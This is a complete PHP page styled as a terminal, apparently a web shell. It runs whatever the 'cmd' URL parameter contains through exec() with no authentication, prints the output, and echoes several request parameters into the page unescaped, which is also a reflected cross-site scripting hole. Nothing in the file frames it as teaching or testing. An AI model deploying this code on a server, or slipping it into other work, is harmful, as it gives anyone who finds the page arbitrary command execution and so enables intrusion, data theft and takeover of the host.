<!DOCTYPE html>

<?php
  $login = exec("whoami");
  $host = exec("hostname");
  $dir = exec("pwd");
?>

<html lang="en">
  <head>
    <title> Command prompt </title>
    <style>
      body {
        background-color: black;
        color: white;
        padding: 1ex 1em;
        font-family: "Lucida Console", Monaco, monospace;
      }
      .name {
        color: lightGreen;
        font-weight: bold;
      }
      .dir {
        color: lightSkyBlue;
        font-weight: bold;
      }
      form {
        display: inline;
      }
      .command {
        background-color: black;
        color: white;
        font-family: "Lucida Console", Monaco, monospace;
        border: none;
      }

    </style>
  </head>

  <body>
    <?php if (isset($_GET["cmd"])): ?>
      <span class="name"> <?=$_GET["oldlogin"]?>@<?=$_GET["oldhost"]?> </span> :
      <span class="dir"> <?=$_GET["olddir"]?> </span> <?=$_GET["oldlogin"] === "root" ? "#" : "$"?>
      <?=$_GET["cmd"]?>
      <br>
      <?php
        $res = [];
        exec($_GET["cmd"], $res);
        foreach ($res as $line):
      ?>
        <?=htmlentities($line)?>
        <br>
      <?php endforeach; ?>
    <?php endif; ?>
    <span class="name"> <?=$login?>@<?=$host?> </span> :
    <span class="dir"> <?=$dir?> </span> <?=$login === "root" ? "#" : "$"?>
    <form>
      <input type="hidden" name="oldlogin" value="<?=$login?>">
      <input type="hidden" name="oldhost" value="<?=$host?>">
      <input type="hidden" name="olddir" value="<?=$dir?>">
      <input type="text" class="command" name="cmd" autofocus>
    </form>
  </body>
</html>
